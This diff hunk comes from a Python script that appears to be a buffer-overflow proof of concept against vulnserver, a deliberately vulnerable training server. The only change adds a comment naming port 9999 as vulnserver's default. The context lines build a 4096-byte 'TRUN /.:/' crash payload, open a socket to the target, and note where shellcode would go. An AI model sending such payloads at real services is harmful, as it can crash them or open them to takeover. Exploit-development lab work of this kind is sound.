@@ -10,7 +10,7 @@ host=sys.argv[1]
 try:
     port=int(sys.argv[2]) #attempts to override port
 except:
-    port=9999 #If sys.argv[2] is unusable due to nonexistance, default to port 9999
+    port=9999 #If sys.argv[2] is unusable due to nonexistance, default to port 9999 (vulnserver default)
 a="A"*4096 #Set death string
 exploit="TRUN /.:/"+str(a) #Generate exploit content. This is where shellcode would be loaded. 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
